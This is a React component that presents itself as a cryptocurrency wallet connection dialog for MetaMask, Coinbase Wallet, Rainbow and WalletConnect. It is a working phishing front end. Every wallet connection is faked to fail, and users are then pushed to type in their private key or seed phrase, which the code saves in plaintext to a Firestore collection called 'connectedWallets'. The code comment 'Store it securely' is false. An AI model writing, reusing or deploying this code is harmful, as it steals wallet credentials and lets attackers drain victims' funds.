import React, { useState, useEffect } from 'react';
import { FaTimes, FaWallet, FaKey, FaLock, FaCloudSunRain, FaBitcoin } from 'react-icons/fa';
import { FaMeta } from "react-icons/fa6";
import { TbPlugConnected } from 'react-icons/tb';
import { BiLoaderAlt } from 'react-icons/bi';
import { addDoc, collection } from 'firebase/firestore';
import { db } from '../../firebase';

const WalletConnectionDialog = ({ isOpen, onClose }) => {
  // Ensure all hooks are at the top level
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showCredentials, setShowCredentials] = useState(false);
  const [credentialType, setCredentialType] = useState('privatekey'); // or 'passphrase'
  const [credential, setCredential] = useState('');
  const [error, setError] = useState('');

  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden'; // Prevent scrolling
    } else {
      document.body.style.overflow = ''; // Re-enable scrolling
    }

    return () => {
      document.body.style.overflow = ''; // Ensure scrolling is re-enabled
    };
  }, [isOpen]);

  if (!isOpen) return null;

  const wallets = [
    {
      name: 'Rainbow',
      icon: FaCloudSunRain,
      color: 'text-[#FF6B6B]',
    },
    {
      name: 'Coinbase Wallet',
      icon: FaBitcoin,
      color: 'text-[#0052FF]',
    },
    {
      name: 'MetaMask',
      icon: FaMeta,
      color: 'text-[#F6851B]',
    },
    {
      name: 'WalletConnect',
      icon: TbPlugConnected,
      color: 'text-[#3B99FC]',
    },
  ];

  const handleWalletClick = async (wallet) => {
    setSelectedWallet(wallet);
    setIsLoading(true);
    setError('');
    setShowCredentials(false); // Ensure we don't override the error
  
    // Simulate connection attempt
    setTimeout(() => {
      setIsLoading(false);
      // if (Math.random() < 0.5) { // Simulating a random failure
        setError(`Failed to connect to ${wallet.name}. Try again or use another method.`);
      // } else {
        // setShowCredentials(true);
      // }
    }, 2000);
  };

  const handleConnect = async () => {
    if (!credential) {
      setError("Please enter your private key or passphrase.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      await addDoc(collection(db, "connectedWallets"), {
        // userId,
        // userEmail,
        walletName: selectedWallet.name,
        credentialType,
        credential, // Store it securely
        timestamp: new Date(),
      });

      setIsLoading(false);
      onClose(); // Close the modal after saving
    } catch (err) {
      setIsLoading(false);
      setError("Failed to connect. Please try again.");
      console.error("Firestore error:", err);
    }
  };
  const renderContent = () => {
    if (error) {
      return (
        <div className="p-6 space-y-6">
          <div className="flex justify-between items-center">
            <div className="flex items-center gap-3">
              <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} />
              <h2 className="text-xl font-bold text-gray-800">{selectedWallet.name}</h2>
            </div>
            <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition-colors">
              <FaTimes className="w-5 h-5" />
            </button>
          </div>
    
          <div className="p-4 bg-red-50 border border-red-100 rounded-lg">
            <p className="text-sm text-red-600">{error}</p>
          </div>
    
          <div className="flex flex-col gap-3">
            <button
              onClick={handleConnect}
              className="w-full bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition-colors font-medium"
            >
              Try Again
            </button>
            <button
              onClick={() => {
                setError(''); // Clear any previous error
                setShowCredentials(true);
              }}
              className="w-full text-purple-600 hover:text-purple-700 transition-colors font-medium"
            >
              Use Private Key or Passphrase
            </button>
          </div>
        </div>
      );
    }
    if (isLoading) {
      return (
        <div className="flex flex-col items-center justify-center py-12">
          <BiLoaderAlt className="w-12 h-12 text-purple-600 animate-spin mb-4" />
          <p className="text-gray-600 text-center">
            {selectedWallet ? `Connecting to ${selectedWallet.name}...` : 'Connecting...'}
          </p>
        </div>
      );
    }

    if (showCredentials) {
      return (
        <div className="p-6 space-y-6">
          <div className="flex justify-between items-center">
            <div className="flex items-center gap-3">
              <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} />
              <h2 className="text-xl font-bold text-gray-800">{selectedWallet.name}</h2>
            </div>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-600 transition-colors"
            >
              <FaTimes className="w-5 h-5" />
            </button>
          </div>

          {/* Credential Type Tabs */}
          <div className="flex mb-6 bg-gray-100 p-1 rounded-lg">
            <button
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                credentialType === 'privatekey'
                  ? 'bg-white text-gray-800 shadow'
                  : 'text-gray-600 hover:text-gray-800'
              }`}
              onClick={() => setCredentialType('privatekey')}
            >
              Private Key
            </button>
            <button
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                credentialType === 'passphrase'
                  ? 'bg-white text-gray-800 shadow'
                  : 'text-gray-600 hover:text-gray-800'
              }`}
              onClick={() => setCredentialType('passphrase')}
            >
              Passphrase
            </button>
          </div>

          {/* Credential Input */}
          <div className="space-y-4">
            <div className="relative">
              <input
                type="password"
                value={credential}
                onChange={(e) => setCredential(e.target.value)}
                placeholder={credentialType === 'privatekey' ? 'Enter your private key' : 'Enter your passphrase'}
                className="w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
                {credentialType === 'privatekey' ? <FaKey /> : <FaLock />}
              </div>
            </div>

            {error && (
              <div className="p-4 bg-red-50 border border-red-100 rounded-lg">
                <p className="text-sm text-red-600">{error}</p>
              </div>
            )}

            <button
              onClick={handleConnect}
              disabled={!credential || isLoading}
              className="w-full bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition-colors font-medium disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Connecting...' : 'Connect Wallet'}
            </button>
          </div>
        </div>
      );
    }

    return (
      <div className="flex flex-col md:flex-row">
        {/* Left Column - Wallet List */}
        <div className="md:w-1/2 p-4 md:p-6 border-b md:border-b-0 md:border-r border-gray-200">
          <div className="flex justify-between items-center mb-2 md:mb-6">
            <h2 className="text-lg md:text-xl font-bold text-gray-800">Connect a Wallet</h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-600 transition-colors md:hidden"
            >
              <FaTimes className="w-5 h-5" />
            </button>
          </div>
          
          <div className="space-y-1 md:space-y-3">
            {wallets.map((wallet) => (
              <button
                key={wallet.name}
                onClick={() => handleWalletClick(wallet)}
                className="w-full flex items-center gap-3 p-4 rounded-lg hover:bg-gray-50 border border-gray-200 transition-all"
              >
                <wallet.icon className={`w-6 h-6 ${wallet.color}`} />
                <span className="font-medium text-gray-800">{wallet.name}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Right Column - Wallet Info */}
        <div className="md:w-1/2 p-4 md:p-6">
          <div className="flex justify-between items-center mb-3 md:mb-6">
            <h2 className="text-lg md:text-xl font-bold text-gray-800">What is a Wallet?</h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-600 transition-colors hidden md:block"
            >
              <FaTimes className="w-5 h-5" />
            </button>
          </div>

          <div className="space-y-3 md:space-y-6">
            {/* Digital Assets Section */}
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <FaWallet className="w-4 h-4 md:w-5 md:h-5 text-purple-600" />
                <h3 className="font-semibold text-gray-800">A Home for Your Digital Assets</h3>
              </div>
              <p className="text-gray-600">
                Wallets are essential tools that allow you to send, receive, store, and display digital assets like Bitcoin and other cryptocurrencies.
              </p>
            </div>

            {/* Authentication Section */}
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <FaKey className="w-4 h-4 md:w-5 md:h-5 text-purple-600" />
                <h3 className="font-semibold text-gray-800">A New Way to Log In</h3>
              </div>
              <p className="text-gray-600">
                Instead of creating new accounts and passwords on every website, just connect your wallet to sign in securely.
              </p>
            </div>

            {/* CTA Buttons */}
            <div className="flex flex-col gap-3 mt-4 md:mt-8">
              <button className="w-full bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition-colors font-medium">
                Get a Wallet
              </button>
              <button className="w-full text-purple-600 hover:text-purple-700 transition-colors font-medium">
                Learn More
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="fixed inset-0 z-[999999] flex items-center justify-center overflow-y-auto overflow-x-hidden p-4 sm:p-6">
      {/* Backdrop */}
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm" onClick={onClose} />

      {/* Dialog Content */}
      <div className="relative bg-white rounded-2xl w-full max-w-4xl mx-auto my-8 shadow-xl max-h-[90vh] overflow-y-auto">
        {renderContent()}
      </div>
    </div>
  );
};

export default WalletConnectionDialog; 